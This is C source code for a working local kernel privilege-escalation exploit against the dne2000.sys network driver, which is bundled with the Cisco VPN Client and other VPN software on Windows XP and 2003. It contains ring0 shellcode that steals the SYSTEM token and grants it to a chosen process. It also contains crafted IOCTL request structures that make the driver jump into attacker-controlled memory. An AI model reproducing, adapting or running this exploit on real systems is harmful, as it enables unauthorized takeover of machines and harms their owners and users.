/* dne2000-call.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Deterministic Network Enhancer (dne2000.sys) local kernel ring0 SYSTEM exploit
 * by mu-b - Sun 06 Jan 2008
 *
 * - Tested on: dne2000.sys 2.21.7.233 <-> 3.21.7.17464
 *     bundled with: SafeNET HighAssurance Remote, SoftRemote
 *                   Cisco VPN Client
 *                   Winproxy
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <ddk/ntapi.h>

#define DNE_IOCTL     0x00222008
#define DNE_FLAG      0x00001005

#define ITEM_FLAG_1   0x4A424F4E
#define ITEM_FLAG_2   0x47554C50
#define FUNC_FLAG     0x00010003

static unsigned char win32_fixup[] =
  "\x56";

static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =
  "\x5e"
  "\xc2\x10\x00";

struct ioctl_func {
  char  _pad[0x04];
  int flag;
  char __pad[0x2C];
  void *func_ptr;
};

struct ioctl_item {
  int flag;
  char _pad[0x24];
  struct ioctl_func *item_func;
  struct ioctl_item *item_ptr;
};

struct ioctl_req {
  int req_num;
  struct ioctl_item *ptr[2];
};

static PCHAR
fixup_ring0_shell (DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

int
main (int argc, char **argv)
{
  struct ioctl_req req;
  struct ioctl_item items[2];
  struct ioctl_func funcs;
  LPVOID zpage, zbuf;
  DWORD rlen, zlen, ppid;
  HANDLE hFile;
  BOOL result;

  printf ("Deterministic Network Enhancer (dne2000.sys) local kernel ring0 SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA ("\\\\.\\DNE", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  zpage = VirtualAlloc (NULL, 0x10000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, "* VirtualAlloc failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x10000);

  memset (zpage, 0xCC, 0x10000);
  zbuf = fixup_ring0_shell (ppid, &zlen);
  memcpy (zpage, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy (zpage + sizeof (win32_fixup) - 1, zbuf, zlen);
  memcpy (zpage + sizeof (win32_fixup) + zlen - 1,
          win32_ret, sizeof (win32_ret) - 1);

  memset (&req, 0, sizeof req);
  req.req_num = DNE_FLAG;
  req.ptr[0] = NULL;
  req.ptr[1] = &items[0];

  memset (items, 0, sizeof items);
  items[0].flag = ITEM_FLAG_1;
  items[0].item_ptr = &items[1];

  items[1].flag = ITEM_FLAG_2;
  items[1].item_func = &funcs;

  memset (&funcs, 0, sizeof funcs);
  funcs.flag = FUNC_FLAG;
  funcs.func_ptr = zpage;

  printf ("* req.ptr: 0x%08X\n", &items[0]);
  printf ("* @0x%08X: flag: 0x%08X, item_ptr:  0x%08X\n",
          &items[0], items[0].flag, items[0].item_ptr);
  printf ("* @0x%08X: flag: 0x%08X, item_func: 0x%08X\n",
          items[0].item_ptr, items[1].flag, items[1].item_func);
  printf ("* @0x%08X: flag: 0x%08X, func_ptr:  0x%08X\n",
          items[1].item_func, funcs.flag, funcs.func_ptr);

  /* jump to our address   :)   */
  printf ("* jumping.. ");
  result = DeviceIoControl (hFile, DNE_IOCTL,
                            &req, sizeof req, &req, sizeof req, &rlen, 0);
  if (!result)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n"
          "* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

